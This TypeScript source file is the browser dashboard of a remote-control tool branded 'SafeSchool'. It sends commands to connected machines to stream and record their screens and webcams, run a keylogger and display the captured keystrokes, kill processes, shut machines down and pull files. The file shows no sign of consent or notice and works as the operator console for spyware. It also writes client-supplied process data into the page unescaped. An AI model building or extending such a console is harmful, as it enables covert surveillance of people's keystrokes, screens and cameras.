// @ts-ignore
import JMuxer from "jmuxer";
import { GatewayWsClient } from "./ws/client";

// --- State ---
interface Client {
    id: number;
    status: "online" | "offline";
    lastSeen: number;
}
let clients: Map<number, Client> = new Map();
let activeClientId: number | null = null;
let wsClient: GatewayWsClient;

// Streaming State
let streamingMode: "monitor" | "webcam" | null = null;
let jmuxerScreen: any = null;
let jmuxerWebcam: any = null;

// --- DOM Elements ---
const elClientList = document.getElementById("client-list")!;
const elMainContent = document.getElementById("main-content")!;
const elViewHome = document.getElementById("view-home")!;
const elViewClient = document.getElementById("view-client")!;
const elHeaderClientName = document.getElementById("header-client-name")!;

const btnPing = document.getElementById("btn-ping")!;
const statusConnection = document.getElementById("status-connection")!;
const statusLatency = document.getElementById("status-latency")!;

// Client Controls
const btnStreamScreen = document.getElementById("btn-stream-screen")!;
const btnStreamWebcam = document.getElementById("btn-stream-webcam")!;
const btnFullscreenScreen = document.getElementById("btn-fullscreen-screen")!;
const btnRefreshTasks = document.getElementById("btn-refresh-tasks")!;
// btnKill, btnShutdown, inpSearchProc are handled inside initEvents or as globals if needed
// but let's define them here for clarity if they are top level
const btnKill = document.getElementById("btn-kill")!;
const btnShutdown = document.getElementById("btn-shutdown")!;
const inpSearchProc = document.getElementById("inp-search-proc") as HTMLInputElement;
const elProcessListBody = document.getElementById("process-list-body")!;
const chkSelectAll = document.getElementById("chk-select-all-procs") as HTMLInputElement;

// --- Config ---
const WS_URL = "ws://192.168.1.10:8080";

// --- Initialization ---
console.log("🚀 SafeSchool Dashboard Initializing...");

initJMuxers();
initWebSocket();
initEvents();

// --- WebSocket ---
function initWebSocket() {
    wsClient = new GatewayWsClient({
        onLog: (msg) => console.log("[WS]", msg),
        onStatus: (s) => {
            statusConnection.textContent = `● ${s}`;
            statusConnection.style.color = s === "CONNECTED" ? "var(--neon-green)" : "var(--destructive)";
        },
        onClientId: (id) => {
            console.log("🆔 My Client ID:", id);
            discoverBackends();
        },
        onGatewayText: (text) => console.log("📢 Gateway:", text),
        onBackendActive: (id) => {
            addOrUpdateClient(id, "online");
        },
        onBackendFrame: (ev) => {
            const b = addOrUpdateClient(ev.backendId, "online");

            // Handle Video & Binary (Multiplexed)
            if (ev.kind === "binary" && activeClientId === ev.backendId) {
                if (!ev.payload || ev.payload.byteLength === 0) return;

                const view = new DataView(ev.payload);
                const type = view.getUint8(0);

                if (type === 0x01 || type === 0x02) {
                    const data = new Uint8Array(ev.payload.slice(1));
                    if (type === 0x01 && jmuxerScreen) {
                        jmuxerScreen.feed({ video: data });
                    } else if (type === 0x02 && jmuxerWebcam) {
                        jmuxerWebcam.feed({ video: data });
                    }
                } else if (type === 0x03) {
                    // File Download: [0x03][4B len][Name][Bytes]
                    const nameLen = view.getUint32(1, false); // Big Endian
                    const nameBytes = new Uint8Array(ev.payload.slice(5, 5 + nameLen));
                    const fileName = new TextDecoder().decode(nameBytes);
                    const fileData = new Uint8Array(ev.payload.slice(5 + nameLen));

                    const blob = new Blob([fileData], { type: "application/octet-stream" });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement("a");
                    a.href = url;
                    a.download = fileName;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    console.log("📥 Downloaded:", fileName);
                }
            } else if (ev.kind === "jpeg" && activeClientId === ev.backendId) {
                // Fallback for MJPEG if needed
                console.warn("Received JPEG, but expecting H.264");
            }

            // Handle Text Responses
            if (ev.kind === "text") {
                handleBackendText(ev.backendId, ev.text);
            }
        },
        onClose: () => {
            setTimeout(() => wsClient.connect(WS_URL), 2000);
        }
    });

    wsClient.connect(WS_URL);
}

function initJMuxers() {
    jmuxerScreen = new JMuxer({
        node: 'monitor-video',
        mode: 'video',
        flushingTime: 0,
        fps: 30,
        debug: false
    });

    jmuxerWebcam = new JMuxer({
        node: 'webcam-video',
        mode: 'video',
        flushingTime: 0,
        fps: 15,
        debug: false
    });
}

function discoverBackends() {
    if (wsClient.isConnected()) wsClient.sendText(0, "ping");
    setTimeout(discoverBackends, 5000); // Ping loop
}

// --- Logic ---

function addOrUpdateClient(id: number, status: "online" | "offline") {
    let c = clients.get(id);
    if (!c) {
        c = { id, status, lastSeen: Date.now() };
        clients.set(id, c);
        renderClientList();
    } else {
        c.status = status;
        c.lastSeen = Date.now();
    }
    return c;
}

function renderClientList() {
    elClientList.innerHTML = "";
    if (clients.size === 0) {
        elClientList.innerHTML = `<div class="p-4 text-muted text-sm">Scanning...</div>`;
        return;
    }

    clients.forEach((c) => {
        const div = document.createElement("div");
        div.className = `client-item ${c.id === activeClientId ? "active" : ""}`;
        div.innerHTML = `
            <div class="flex items-center gap-2">
                <div class="status-indicator ${c.status}"></div>
                <span class="font-mono font-bold">Client #${c.id}</span>
            </div>
            <span class="text-xs text-muted">IP: 192.168.1.x</span>
        `;
        div.onclick = () => setActiveClient(c.id);
        elClientList.appendChild(div);
    });
}

function setActiveClient(id: number | null) {
    activeClientId = id;
    renderClientList(); // Update active class

    if (!id) {
        elViewHome.style.display = "flex";
        elViewClient.style.display = "none";
        elHeaderClientName.textContent = "Overview";
        return;
    }

    const c = clients.get(id);
    elHeaderClientName.textContent = `Client #${id}`;
    elViewHome.style.display = "none";
    elViewClient.style.display = "grid";

    // Reset streams when switching
    if (streamingMode) stopCurrentStream();
}

function initEvents() {
    btnPing.onclick = () => discoverBackends();

    // Recording Buttons
    const btnRecordScreen = document.getElementById("btn-record-screen")!;
    const btnRecordWebcam = document.getElementById("btn-record-webcam")!;

    btnRecordScreen.onclick = () => {
        if(activeClientId) {
            wsClient.sendText(activeClientId, "record_screen_10s");
            btnRecordScreen.textContent = "Recording...";
            btnRecordScreen.setAttribute("disabled", "true");
            setTimeout(() => {
                btnRecordScreen.textContent = "Rec (10s)";
                btnRecordScreen.removeAttribute("disabled");
            }, 10000);
        }
    };

    // Keylogger Toggle
    const btnKeylogToggle = document.getElementById("btn-keylog-toggle")!;
    let isKeylogging = false;
    btnKeylogToggle.onclick = () => {
        if (!activeClientId) {
            console.warn("Keylogger: No active client selected.");
            return;
        }
        console.log("Keylogger button clicked. State:", isKeylogging, "ActiveClient:", activeClientId);

        if (!isKeylogging) {
            console.log("Sending: start_keylog");
            wsClient.sendText(activeClientId, "start_keylog");
            btnKeylogToggle.textContent = "Disable Keylogger";
            btnKeylogToggle.classList.add("btn-destructive");
            isKeylogging = true;
        } else {
            console.log("Sending: stop_keylog");
            wsClient.sendText(activeClientId, "stop_keylog");
            btnKeylogToggle.textContent = "Enable Keylogger";
            btnKeylogToggle.classList.remove("btn-destructive");
            isKeylogging = false;
        }
    };

    btnRecordWebcam.onclick = () => {
        if(activeClientId) {
            wsClient.sendText(activeClientId, "record_webcam_10s");
            btnRecordWebcam.textContent = "Recording...";
            btnRecordWebcam.setAttribute("disabled", "true");
            setTimeout(() => {
                btnRecordWebcam.textContent = "Rec (10s)";
                btnRecordWebcam.removeAttribute("disabled");
            }, 10000);
        }
    };

    // Fullscreen
    btnFullscreenScreen.onclick = () => {
        const el = document.getElementById("monitor-video");
        if (el && el.requestFullscreen) el.requestFullscreen();
    };

    // Stream Buttons
    btnStreamScreen.onclick = () => {
        if (!activeClientId) return;
        if (btnStreamScreen.textContent === "Start Stream") {
            wsClient.sendText(activeClientId, "start_monitor_stream");
            streamingMode = "monitor";
            btnStreamScreen.textContent = "Stop Stream";
            btnStreamScreen.classList.add("btn-destructive");
        } else {
            wsClient.sendText(activeClientId, "stop_monitor_stream");
            stopCurrentStream();
        }
    };

    btnStreamWebcam.onclick = () => {
        if (!activeClientId) return;
        if (btnStreamWebcam.textContent === "Start Cam") {
            wsClient.sendText(activeClientId, "start_webcam_stream");
            streamingMode = "webcam";
            btnStreamWebcam.textContent = "Stop Cam";
            btnStreamWebcam.classList.add("btn-destructive");
        } else {
            wsClient.sendText(activeClientId, "stop_webcam_stream");
            stopCurrentStream();
        }
    };

    btnRefreshTasks.onclick = () => {
        if (activeClientId) {
            console.log("Refreshing process list for client", activeClientId);
            const originalText = btnRefreshTasks.textContent;
            btnRefreshTasks.textContent = "Refreshing...";
            btnRefreshTasks.setAttribute("disabled", "true");

            wsClient.sendText(activeClientId, "list_process");

            // Revert after 1s (or ideally after response, but simple timeout works for feedback)
            setTimeout(() => {
                btnRefreshTasks.textContent = originalText;
                btnRefreshTasks.removeAttribute("disabled");
            }, 1000);
        } else {
            console.warn("Cannot refresh: No active client selected");
        }
    };

    // Process Search Feedback
    inpSearchProc.addEventListener("input", () => {
        const term = inpSearchProc.value.toLowerCase();
        const rows = document.querySelectorAll("#process-list-body tr");
        if (term) {
            inpSearchProc.style.border = "1px solid var(--neon-cyan)";
            inpSearchProc.style.boxShadow = "0 0 5px var(--neon-cyan)";
        } else {
            inpSearchProc.style.border = "";
            inpSearchProc.style.boxShadow = "";
        }
        rows.forEach((row: any) => {
            const text = row.innerText.toLowerCase();
            row.style.display = text.includes(term) ? "" : "none";
        });
    });

    // Select All
    chkSelectAll.onchange = () => {
        const checkboxes = document.querySelectorAll(".chk-proc-row") as NodeListOf<HTMLInputElement>;
        checkboxes.forEach(kb => {
            if (kb.closest("tr")?.style.display !== "none") {
                kb.checked = chkSelectAll.checked;
            }
        });
    };

    // Multi-Kill
    btnKill.onclick = () => {
        if (!activeClientId) return;
        const checked = document.querySelectorAll(".chk-proc-row:checked");
        if (checked.length === 0) return alert("No processes selected!");

        if (confirm(`Kill ${checked.length} selected processes?`)) {
            checked.forEach((kb: any) => {
                const pid = kb.getAttribute("data-pid");
                if (pid) wsClient.sendText(activeClientId!, `kill_process ${pid}`);
            });
            setTimeout(() => wsClient.sendText(activeClientId!, "list_process"), 1000);
        }
    };

    // Process List Delegation (Kill Button)
    elProcessListBody.addEventListener("click", (e) => {
        const target = e.target as HTMLElement;
        const btn = target.closest(".btn-kill-proc"); // Safer than classList check

        if (btn) {
            const pid = btn.getAttribute("data-pid");
            if (pid && activeClientId) {
                if (confirm(`Are you sure you want to KILL process ${pid}?`)) {
                    wsClient.sendText(activeClientId, `kill_process ${pid}`);
                    // Optimistic UI update could happen here, but wait for list refresh is safer
                    setTimeout(() => wsClient.sendText(activeClientId!, "list_process"), 500);
                }
            }
        }
    });

    // Client Shutdown
    btnShutdown.onclick = () => {
        if (activeClientId && confirm(`Are you sure you want to SHUTDOWN Client #${activeClientId}?`)) {
            wsClient.sendText(activeClientId, "shutdown");
        }
    };

    // ... [Keylogger Toggle code remains same] ...
}

function stopCurrentStream() {
    // ... [remains same] ...
    streamingMode = null;
    btnStreamScreen.textContent = "Start Stream";
    btnStreamScreen.classList.remove("btn-destructive");
    btnStreamWebcam.textContent = "Start Cam";
    btnStreamWebcam.classList.remove("btn-destructive");
    jmuxerScreen?.reset();
    jmuxerWebcam?.reset();
}

function handleBackendText(id: number, text: string) {
    if (id !== activeClientId) return;

    // console.log("Received text:", text.substring(0, 50) + "..."); // Debug log

    // Keylogger Data
    if (text.startsWith("KEYLOG: ")) {
        const char = text.substring(8);
        const feed = document.getElementById("keylog-feed")!;
        feed.innerText += char;
        feed.scrollTop = feed.scrollHeight;
    }
    // Process List response
    else if (text.includes("PID") && text.includes("NAME")) { // Header check
        console.log("✅ Received Process List response");
        parseProcessList(text);
    }
    // Command feedback
    else if (text.startsWith("OK:")) {
        console.log("Success:", text);
        // Visual feedback for user
        const msg = text.substring(4);
        alert("✅ Success: " + msg);
        // Or clearer status update
        const status = document.getElementById("status-message");
        if(status) status.textContent = "Last Action: " + msg;
    }
    else if (text.startsWith("ERROR:")) {
        alert("❌ " + text);
    }
}

function parseProcessList(raw: string) {
    elProcessListBody.innerHTML = "";
    const lines = raw.split("\n").slice(1);
    lines.forEach(line => {
        if (!line.trim()) return;
        const parts = line.trim().split(/\s+/);

        // Format: PID NAME USER CMD
        const pid = parts[0];
        const name = parts[1];
        const user = parts[2];
        const cmd = parts.slice(3).join(" ");

        // If cmd is empty (rare), use name
        const displayCmd = cmd || name;

        const tr = document.createElement("tr");
        tr.innerHTML = `
            <td><input type="checkbox" class="chk-proc-row" data-pid="${pid}"></td>
            <td>${pid}</td>
            <td class="text-primary truncate" style="max-width: 200px;" title="${displayCmd}">${name}</td>
            <td>${user}</td>
            <td><button class="btn btn-sm btn-destructive btn-kill-proc" data-pid="${pid}">Kill</button></td>
        `;
        elProcessListBody.appendChild(tr);
    });
}
